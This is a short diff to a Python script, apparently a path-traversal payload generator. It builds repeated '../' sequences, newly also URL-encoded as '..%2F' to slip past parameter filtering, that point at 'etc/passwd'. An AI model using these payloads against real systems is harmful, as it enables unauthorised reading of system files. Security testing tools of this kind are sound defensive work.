@@ -2,11 +2,14 @@
 import itertools
 import re
 
+## add %2F in case of parameter escape
+
 def get_all(depth_count=8):
 	paths = []
-	dotvar = "../"
+	dotvar = ["../","..%2F"]
 	for i in range(1, depth_count):
-		paths.append(i* dotvar)
+		for j in dotvar:
+			paths.append(i* j)
 
 	payload = "etc/passwd"
 
